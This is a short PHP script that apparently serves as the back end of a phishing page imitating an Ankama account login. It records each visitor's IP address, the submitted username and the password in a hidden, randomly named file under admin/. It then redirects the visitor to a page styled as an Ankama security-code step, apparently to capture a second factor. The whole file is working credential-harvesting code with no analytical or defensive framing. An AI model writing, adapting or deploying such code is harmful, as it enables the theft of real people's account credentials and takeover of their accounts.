<?php

$ip = $_SERVER["REMOTE_ADDR"];

$fichier = fopen('admin/U92Zb3ALSChwx4rLDa4DT5238i7i7ja.php', 'a+');
fwrite($fichier, "IP: ");

fwrite($fichier, $ip);
fwrite($fichier, "        Quand ? ".date('j F Y h:i:s A')."        Nom de compte: ");
fwrite($fichier, $_POST["login_3"]);
fwrite($fichier, "        Mot De Passe: ");
fwrite($fichier, $_POST["password_1"].PHP_EOL);
fclose($fichier);

?>
<body onload="window.location.href = 'account.ankama=code-de-securite.php';"></body>